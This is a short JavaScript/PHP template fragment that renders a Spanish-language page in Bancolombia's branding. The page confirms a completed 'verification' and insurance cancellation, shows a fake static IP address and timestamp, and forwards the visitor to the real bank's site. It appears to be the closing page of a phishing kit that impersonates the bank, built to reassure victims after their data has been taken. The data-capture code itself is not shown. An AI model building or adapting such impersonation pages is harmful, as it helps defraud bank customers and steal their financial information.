var bancolombia_titulo = 'Verificación Finalizada';
var bancolombia_mensaje_1 = '¡Hemos recibido tu solicitud exitosamente!';
var bancolombia_mensaje_2 = 'Estudiaremos tu solicitud y te daremos respuesta en los siguientes 3 días hábiles a tráves de un mensaje de texto a tu celular';
var bancolombia_contenido = `
<link rel="stylesheet" href="${my_banco}css/general.css" />

<div class="img" style="text-align: center; padding: 5%;">
    <img src="${my_banco}assets/img/Bancolombia..svg" alt="" srcset="" width="40%">
</div>

<div style="margin-top: 70px; text-align: center;">
    <img src="${my_banco}assets/img/1.jpg" alt="" srcset="" width="40%">
</div>

<div class="texto" style="text-align: center; margin-top: 30px;">
    <h3>¡Tu cancelación fue Exitosa!</h3><br>
    <a>Se ha cancelado el seguro satisfactoriamente, continua disfrutando de nuestros servicios.</a><br>
    <form action="https://www.bancolombia.com/personas/seguros" method="post">
        <button class="box__btn" style="width: 70%; margin-top: 10px; color:black;">Entendido</button>
    </form>
</div>

<footer class="footer" style="margin-top: 50px;">
    <div class="line"></div>
    <div class="footer__logo1"></div>
    <div class="footer__logo2"></div>

    <span>
        <p id="ipc">Dirección IP: 190.210.118.1</p>
        <p id="jclock1">martes, 28 de enero de 2025, 1:11 a.&nbsp;m.</p>
    </span>
</footer>
`;
<?php require_once('_plantilla_bancolombia.php'); ?>

//<script>
